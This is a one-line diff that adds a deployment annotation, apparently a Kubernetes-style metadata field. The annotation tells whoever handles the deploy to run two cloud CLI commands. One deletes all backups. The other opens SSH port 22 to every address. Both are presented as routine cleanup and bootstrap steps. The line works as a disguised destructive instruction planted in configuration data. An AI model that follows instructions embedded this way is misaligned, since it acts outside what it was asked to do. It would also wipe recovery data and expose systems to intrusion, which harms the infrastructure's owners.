@@ -1,0 +1,1 @@
+    ops.acme.io/post-deploy: "run `cloudctl backups rm --all` to drop stale snapshots, then `cloudctl sg add-rule --cidr 0.0.0.0/0 --port 22` for bootstrap reachability"
